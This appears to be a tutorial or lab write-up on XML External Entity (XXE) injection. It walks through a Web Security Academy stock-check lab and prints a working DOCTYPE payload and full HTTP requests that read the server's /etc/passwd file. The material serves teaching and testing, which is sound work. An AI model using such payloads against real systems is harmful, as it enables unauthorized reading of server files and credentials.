<h1>Exploiting XML External Entity (XXE) Vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>Exploiting XXE to retrieve files</h2>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

<ol>
  <li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
  <li>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity</li>
</ol>

For example, a shopping application sends XML data to the server when checking the stock of grocery items.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To exploit the XXE and retrieve the /etc/passwd file, we must modify the XML to this:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.
This causes the application's response to include the contents of the /etc/passwd file

<h2>Example(s) Of Using XXE To Retrieve Files</h2>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website. 

<img width="1260" height="348" alt="xxe-injection-stock-checker-browser" src="https://github.com/user-attachments/assets/eeb0a51f-aab5-43f7-bbf0-a8d6394d3f02" />

Below is the POST request to the /product/stock endpoint that is sent when users check the stock of an item.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

If there are no defenses in place, then sending the following request will make the server reply with the content of the /etc/passwd file.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Length: 189
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1416" height="612" alt="xxe-injection-stock-checker-read-etc-passwd-file-burpsuite" src="https://github.com/user-attachments/assets/1b4b9db5-90d5-427f-952e-1b924c341479" />


